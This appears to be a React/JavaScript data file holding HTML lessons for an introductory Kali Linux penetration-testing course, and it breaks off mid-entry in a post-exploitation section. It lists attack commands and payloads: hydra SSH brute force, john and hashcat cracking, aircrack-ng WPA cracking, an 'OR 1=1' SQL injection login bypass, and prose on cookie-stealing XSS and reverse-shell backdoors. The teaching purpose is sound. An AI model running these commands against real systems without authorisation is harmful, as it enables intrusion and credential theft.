import {  Terminal } from 'lucide-react';
import { echo, help, whoami, ls, clear, date, history } from './commands';


export const courseCategories =[
    {
        id: "kali-linux-basics",
        title: "Introduction to Kali Linux, Setup, Linux Basics, and Tools ",
        chapters: [
            {
                id: "module-1",
                title: 'Module 1: Introduction to Kali Linux',
                icon: Terminal,
                sections: [
                    {
                        title: 'Section 1: Introduction to Kali Linux',
                        content: `
                            <h4 class="font-bold">What is Kali Linux?</h4>
                            <div class="mb-6">
                                <p>Kali Linux is a specialized operating system based on Debian, designed primarily for penetration testing and cybersecurity assessments. It provides a comprehensive platform for a wide range of security tasks, such as vulnerability testing, ethical hacking, and digital forensics.</p>
                            </div>
            
                            <h4 class="font-bold">Key Features</h4>
                            <ul class="pl-6 mb-6">
                                <li>Comes with a large suite of pre-installed tools for cybersecurity professionals.</li>
                                <li>Tailored for use in penetration testing and ethical hacking scenarios.</li>
                            </ul>
            
                            <h4 class="font-bold">Purpose and Use Cases</h4>
                            <ul class="pl-6 mb-6">
                                <li>Penetration Testing: Identifying and exploiting vulnerabilities to test system security.</li>
                                <li>Cybersecurity Assessments: Evaluating networks, applications, and devices to measure security strength.</li>
                                <li>Digital Forensics: Analyzing compromised systems for signs of cybercrimes or data breaches.</li>
                                <li>Security Research: Discovering new attack vectors and performing research in offensive security.</li>
                            </ul>
            
                            <h4 class="font-bold">History</h4>
                            <ul class="pl-6 mb-6">
                                <li>Origins: Kali Linux was developed by Offensive Security and was released in 2013.</li>
                                <li>Evolution: It evolved from BackTrack, a pioneering security distribution. Kali is fully Debian-based, improving stability, performance, and compatibility.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Section 2: Installation and Setup',
                        content: `
                            <h4 class="font-bold">Downloading Kali Linux</h4>
                            <div class="mb-6">
                                <p>Sources: Kali can be downloaded from the official Kali website (https://www.kali.org/).</p>
                            </div>
            
                            <h4 class="font-bold">Available Formats</h4>
                            <ul class="pl-6 mb-6">
                                <li>ISO Image: For installation on physical hardware or virtual machines.</li>
                                <li>Pre-built Virtual Machines: Available for VMware and VirtualBox.</li>
                                <li>Live USB: Boot Kali directly from a USB drive without installation.</li>
                            </ul>
            
                            <h4 class="font-bold">Installation Methods</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Method</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Physical Installation</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Install Kali on a dedicated machine. The process involves booting from the installation media (USB or DVD) and following the setup wizard.</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Virtual Machines</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Install Kali in VMware or VirtualBox for isolated environments, ideal for testing.</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">Live USB</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">Boot Kali directly from a USB drive. This is portable and doesn't affect the host operating system.</td>
                                    </tr>
                                </tbody>
                            </table>
            
                            <h4 class="font-bold">Basic Configuration</h4>
                            <ul class="pl-6 mb-6">
                                <li>Network Configuration: Set up network interfaces to connect to the internet or local networks.</li>
                                <li>System Updates: Run apt update and apt upgrade to keep the system updated.</li>
                                <li>User Accounts: Configure user accounts, with options for privileged (root) or standard users.</li>
                            </ul>
                        `
                    },
                    {
                        title: 'Section 3: Kali Linux Interface',
                        content: `
                            <h4 class="font-bold">Desktop Environments</h4>
                            <ul class="pl-6 mb-6">
                                <li>GNOME: A full-featured desktop environment with simplicity and user-friendliness.</li>
                                <li>Xfce: A lightweight environment, perfect for low-resource systems.</li>
                                <li>KDE: A highly customizable and visually attractive interface.</li>
                            </ul>
                    
                            <h4 class="font-bold">File System Navigation</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Directory</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Purpose</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">/home</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Stores user files</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">/etc</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Configuration files</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">/bin</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Essential binaries</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">/usr</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">User programs and data</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">/var</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">Logs and variable data</td>
                                    </tr>
                                </tbody>
                            </table>
                    
                            <h4 class="font-bold">Basic Commands</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Command</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Function</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">ls</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">List files and directories</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">cd</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Change directory</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">pwd</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Print the current directory path</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">cat</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Display the content of a file</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">cp, mv, rm</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">Copy, move, and remove files</td>
                                    </tr>
                                </tbody>
                            </table>
                        `
                    },
                    {
                        title: 'Section 4: Linux Basics for Kali',
                        content: `
                            <h4 class="font-bold">File Permissions</h4>
                            <div class="mb-6">
                                <h5 class="font-semibold">Permission Types:</h5>
                                <ul class="pl-6 mb-4">
                                    <li>Read (r): View contents</li>
                                    <li>Write (w): Modify contents</li>
                                    <li>Execute (x): Run the file</li>
                                </ul>
                    
                                <h5 class="font-semibold">User Categories:</h5>
                                <ul class="pl-6 mb-4">
                                    <li>Owner: The file's creator</li>
                                    <li>Group: Users who belong to the same group</li>
                                    <li>Others: All other users</li>
                                </ul>
                    
                                <h5 class="font-semibold">Managing Permissions:</h5>
                                <ul class="pl-6 mb-4">
                                    <li>chmod: Modify file permissions</li>
                                    <li>chown: Change file ownership</li>
                                </ul>
                            </div>
                    
                            <h4 class="font-bold">Package Management</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Command</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Purpose</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">apt update</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Refresh package repositories</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">apt upgrade</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Install available updates</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">apt install [package_name]</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Install new software</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">apt remove [package_name]</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">Remove installed software</td>
                                    </tr>
                                </tbody>
                            </table>
                    
                            <h4 class="font-bold">Text Editors</h4>
                            <ul class="pl-6 mb-6">
                                <li>nano: A simple terminal-based editor</li>
                                <li>vim: A powerful and advanced terminal editor</li>
                                <li>gedit: A GUI-based editor for users who prefer a graphical interface</li>
                            </ul>
                    
                            <h4 class="font-bold">Networking Basics</h4>
                            <ul class="pl-6 mb-6">
                                <li>Network Configuration:
                                    <ul class="pl-6">
                                        <li>ifconfig or ip a: Display network interfaces and configuration</li>
                                        <li>nmcli: A command-line interface for managing network settings</li>
                                    </ul>
                                </li>
                                <li>Understanding IP Addressing:
                                    <ul class="pl-6">
                                        <li>Kali Linux supports IPv4 and IPv6 addressing for communication over networks</li>
                                    </ul>
                                </li>
                            </ul>
                        `
                    },
                    {
                        title: 'Section 5: Kali Linux Tools Overview',
                        content: `
                            <h4 class="font-bold">Categories of Tools</h4>
                            <ul class="pl-6 mb-6">
                                <li>Information Gathering: Tools to collect information about targets (e.g., nmap, theHarvester)</li>
                                <li>Vulnerability Analysis: Tools to assess system vulnerabilities (e.g., OpenVAS, Nikto)</li>
                                <li>Exploitation Tools: Tools for exploiting vulnerabilities in systems (e.g., Metasploit)</li>
                                <li>Wireless Attacks: Tools to test wireless networks (e.g., Aircrack-ng)</li>
                                <li>Web Application Testing: Tools to evaluate the security of web applications (e.g., Burp Suite)</li>
                            </ul>
                    
                            <h4 class="font-bold">Using the Kali Menu</h4>
                            <ul class="pl-6 mb-6">
                                <li>Information Gathering</li>
                                <li>Vulnerability Analysis</li>
                                <li>Exploitation Tools</li>
                                <li>Sniffing and Spoofing</li>
                                <li>Web Application Analysis</li>
                            </ul>
                    
                            <h4 class="font-bold">Basic Tool Usage</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Tool</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">nmap</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">A network exploration tool used for security auditing and scanning. Example command: nmap -sP 192.168.1.0/24 scans a subnet for active hosts.</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Wireshark</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">A network packet analyzer that captures and inspects network traffic in real-time.</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Metasploit</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">An advanced framework for discovering and exploiting vulnerabilities in a system. Example: msfconsole starts the Metasploit console for penetration testing.</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">Burp Suite</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">A web vulnerability scanner designed for assessing the security of web applications, capable of detecting issues like SQL injection and cross-site scripting (XSS).</td>
                                    </tr>
                                </tbody>
                            </table>
                        `
                    }
                    
                ],
                videoUrl: 'https://www.youtube.com/embed/example',
                commands: { echo, help, whoami, ls, clear, date, history },
                content: ''
            },
            {
                id: "module-2",
                title: 'Module 2: Information Gathering, Vulnerability Analysis, and Network Attacks',
                icon: Terminal,
                sections: [
                    {
                        title: 'Section 1: Information Gathering',
                        content: `
                            <h4 class="font-bold">Passive Reconnaissance</h4>
                            <div class="mb-6">
                                <p>Passive reconnaissance is about gathering publicly available data and intelligence about a target without directly interacting with it. This helps attackers avoid detection while collecting useful details for later exploitation.</p>
                            </div>
            
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Tool</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description & Example</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">theHarvester</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Collects email addresses, subdomains, and other public information from search engines, social media, and DNS records.<br>Example Command: theHarvester -d example.com -b google — Gathers emails linked to "example.com" via Google.</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">Maltego</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">An OSINT tool that maps out relationships between various entities. Example: Visualizes the relationship between a target domain and its subdomains, IP addresses, and email addresses.</td>
                                    </tr>
                                </tbody>
                            </table>
            
                            <h4 class="font-bold">Active Reconnaissance</h4>
                            <div class="mb-6">
                                <p>Active reconnaissance involves directly interacting with the target system, which may trigger alarms but is essential for gathering real-time data on vulnerabilities.</p>
                            </div>
            
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Tool</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description & Example</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">nmap</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">A widely used tool for scanning networks.<br>Example Command: nmap -sP 192.168.1.0/24 — Scans a network subnet for live hosts.</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">Nikto</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">A web server scanner that identifies vulnerabilities.<br>Example Command: nikto -h http://example.com — Scans the web server for security issues.</td>
                                    </tr>
                                </tbody>
                            </table>
            
                            <h4 class="font-bold">DNS Enumeration</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Tool</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description & Example</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">dnsenum</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Gathers DNS information.<br>Example Command: dnsenum example.com — Retrieves DNS records.</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">whois</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">A tool for obtaining domain registration details.<br>Example Command: whois example.com — Returns detailed registration info.</td>
                                    </tr>
                                </tbody>
                            </table>
                        `
                    },
                    {
                        title: 'Section 2: Vulnerability Analysis',
                        content: `
                            <h4 class="font-bold">Vulnerability Scanning</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Tool</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">OpenVAS</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">An open-source vulnerability scanner that scans for known vulnerabilities across systems. Example: Running OpenVAS identifies vulnerabilities of varying risk levels.</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">Nessus</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">A popular vulnerability scanner known for its plugin library and frequent updates.</td>
                                    </tr>
                                </tbody>
                            </table>
            
                            <h4 class="font-bold">Exploitation Frameworks</h4>
                            <div class="mb-6">
                                <h5 class="font-semibold">Metasploit</h5>
                                <p class="mb-4">A powerful penetration testing framework with an extensive array of exploits, payloads, and auxiliary tools.</p>
                                <ul class="pl-6">
                                    <li>Example: After identifying a vulnerability with nmap, Metasploit can be used to exploit it and gain access.</li>
                                    <li>Command: msfconsole — Launches the Metasploit framework.</li>
                                </ul>
                            </div>
            
                            <h4 class="font-bold">Manual Testing</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Vulnerability</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description & Example</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">SQL Injection</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">A vulnerability in web applications where attackers manipulate SQL queries. Example: Injecting malicious SQL code into input fields like login forms to retrieve or alter data.</td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">Cross-Site Scripting (XSS)</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">An attack where malicious scripts are injected into web pages. Example: Inserting a script into an input field to see if the website improperly executes it.</td>
                                    </tr>
                                </tbody>
                            </table>
                        `
                    },
                    {
                        title: 'Section 3: Network Attacks',
                        content: `
                            <h4 class="font-bold">Sniffing and Spoofing</h4>
                            <div class="mb-6">
                                <p>Network sniffing involves capturing and analyzing data packets on the network, while spoofing impersonates another user or system to gain unauthorized access.</p>
                            </div>
                    
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Tool</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description & Example</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">Wireshark</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">A real-time network packet analyzer that captures and inspects network traffic. Example: Using Wireshark to sniff network traffic for unencrypted data such as usernames or passwords sent over HTTP.</td>
                                    </tr>
                                </tbody>
                            </table>
                    
                            <h4 class="font-bold">MITM (Man-in-the-Middle) Attacks</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Tool</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description & Example</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">BetterCAP</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">A tool for performing MITM attacks, intercepting network traffic, injecting malicious payloads, and conducting other attacks like DNS spoofing and SSL stripping. Example: Intercepting HTTP traffic and injecting malicious scripts or stealing credentials.</td>
                                    </tr>
                                </tbody>
                            </table>
                    
                            <h4 class="font-bold">Wireless Attacks</h4>
                            <div class="mb-6">
                                <p>Wireless attacks target vulnerabilities in Wi-Fi networks and devices connected to them, allowing attackers to exploit weaknesses in wireless protocols.</p>
                            </div>
                    
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Tool</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description & Commands</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">Aircrack-ng</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">
                                            A toolset used for auditing wireless networks and cracking encryption keys (e.g., WEP, WPA, WPA2).
                                            <br><br>
                                            Example: Using Aircrack-ng to capture wireless traffic, crack the WPA handshake, and gain access to a Wi-Fi network.
                                            <br><br>
                                            Commands:
                                            <ul class="pl-6">
                                                <li>airmon-ng start wlan0 — Enables monitoring mode on the wireless adapter</li>
                                                <li>aircrack-ng captured_file.cap — Cracks the WPA handshake from a captured file</li>
                                            </ul>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        `
                    }
                    
                ],
                videoUrl: 'https://www.youtube.com/embed/example',
                commands: { echo, help, whoami, ls, clear, date, history },
                content: ''
            },


            
              
        ]
    },
    {
        id: "kali-linux-basics",
        title: "Introduction to Kali Linux, Setup, Linux Basics, and Tools ",
        chapters: [
            {
                id: "module-3",
                title: 'Module 3: Web Application Testing, Password Attacks, and Post-Exploitation',
                icon: Terminal,
                sections: [
                    {
                        title: 'Section 1: Web Application Testing',
                        content: `
                            <h4 class="font-bold">Web Vulnerability Scanning</h4>
                            <div class="mb-6">
                                <p>Web vulnerability scanning is essential for identifying security issues that could lead to exploitation of web applications. Common vulnerabilities include XSS, SQL injection, and improper input validation.</p>
                            </div>
            
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Tool</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description & Features</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Burp Suite</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">
                                            Comprehensive web application security testing tool.
                                            <ul class="pl-6 mt-2">
                                                <li>Features: Intercepting HTTP/S traffic, automated vulnerability scanning, and manual testing</li>
                                                <li>Example: Using Burp Suite's scanner to identify vulnerabilities such as unsafe HTTP headers or unvalidated input fields</li>
                                            </ul>
                                        </td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">OWASP ZAP</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">
                                            Open-source security scanner focused on web application vulnerabilities.
                                            <ul class="pl-6 mt-2">
                                                <li>Known for automation, reporting, and easy integration into CI/CD pipelines</li>
                                                <li>Example: Scanning a web application to detect issues like improper input validation or CSRF vulnerabilities</li>
                                            </ul>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
            
                            <h4 class="font-bold">Exploiting Vulnerabilities</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Attack Type</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description & Example</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">SQL Injection (SQLi)</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">
                                            Attackers inject malicious SQL queries into user input fields.
                                            <br>Example: Injecting OR 1=1 into a login form to bypass authentication.
                                        </td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">Cross-Site Scripting (XSS)</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">
                                            Injecting malicious scripts into web pages.
                                            <br>Example: Injecting a &lt;script&gt; tag that steals session cookies.
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
            
                            <h4 class="font-bold">Brute Force Attacks</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Tool</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description & Command</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">Hydra</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">
                                            A fast and flexible password-cracking tool.
                                            <br>Command: hydra -l admin -P /path/to/wordlist.txt ssh://target.com
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        `
                    },
                    {
                        title: 'Section 2: Password Attacks',
                        content: `
                            <h4 class="font-bold">Password Cracking</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Tool</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description & Command</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">John the Ripper</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">
                                            Open-source tool for cracking passwords via dictionary and brute-force attacks.
                                            <br>Command: john --wordlist=passwords.txt hashes.txt
                                        </td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">Hashcat</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">
                                            High-speed, GPU-accelerated password cracking tool.
                                            <br>Command: hashcat -m 0 -a 0 hashfile.txt wordlist.txt
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
            
                            <h4 class="font-bold">Wordlist Generation</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Tool</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description & Command</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">Crunch</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">
                                            Tool for generating custom wordlists based on user-defined parameters.
                                            <br>Command: crunch 8 8 -o mywordlist.txt -t @@@@1234
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
            
                            <h4 class="font-bold">Brute Force Techniques</h4>
                            <div class="mb-6">
                                <p>Brute force involves trying every possible combination until the correct password is found. This method can be very slow but effective against weak passwords.</p>
                                <ul class="pl-6 mt-4">
                                    <li>Methodology: Brute-force cracking can be performed on passwords, encryption keys, or hashes.</li>
                                    <li>Example: Using brute-force to try every combination of lowercase letters for a 6-character password.</li>
                                </ul>
                            </div>
                        `
                    },
                    {
                        title: 'Section 3: Post-Exploitation',
                        content: `
                            <h4 class="font-bold">Maintaining Access</h4>
                            <table class="min-w-full border-collapse bg-white shadow-sm rounded-lg overflow-hidden mb-6">
                                <thead>
                                    <tr class="bg-gray-100">
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Technique</th>
                                        <th class="px-6 py-3 text-left text-sm font-semibold text-gray-700 uppercase tracking-wider border-b">Description & Example</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">Backdoors</td>
                                        <td class="px-6 py-4 text-sm text-gray-900 border-b">
                                            Attackers install backdoors to bypass normal authentication and ensure remote access.
                                            <br>Example: Installing a reverse shell or trojan to maintain remote access without needing to re-exploit the system.
                                        </td>
                                    </tr>
                                    <tr class="hover:bg-gray-50">
                                        <td class="px-6 py-4 text-sm text-gray-900">Persistence Methods</td>
                                        <td class="px-6 py-4 text-sm text-gray-900">
                                            These methods guarantee that attackers retain access even after system reboots or security changes.
